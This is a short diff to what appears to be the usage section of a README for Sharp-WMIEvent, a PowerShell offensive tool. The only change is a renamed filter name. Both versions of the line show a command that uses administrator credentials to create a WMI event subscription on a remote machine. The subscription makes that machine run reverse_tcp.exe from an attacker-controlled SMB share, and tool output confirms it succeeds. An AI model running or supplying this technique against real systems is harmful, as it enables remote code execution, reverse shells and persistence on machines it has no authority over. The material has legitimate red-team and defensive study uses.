@@ -17,7 +17,7 @@ Execute attack payload in SMB share.
 ```powershell
 PS C:\Users\Administrator> Import-Module .\Sharp-WMIEvent.ps1
 
-PS C:\Users\Administrator> Sharp-WMIEvent -ConsumerType Command -ComputerName 10.10.10.19 -Domain Domain.com -Username Administrator -Password Admin@123 -Command "C:\Windows\System32\cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName 1waawd2 -ConsumerName Test
+PS C:\Users\Administrator> Sharp-WMIEvent -ConsumerType Command -ComputerName 10.10.10.19 -Domain Domain.com -Username Administrator -Password Admin@123 -Command "C:\Windows\System32\cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName Test -ConsumerName Test
 [+] Creating The WMI Event Filter
 [+] Creating The WMI Event Consumer
 [+] Creating The WMI Event Filter And Event Consumer Binding
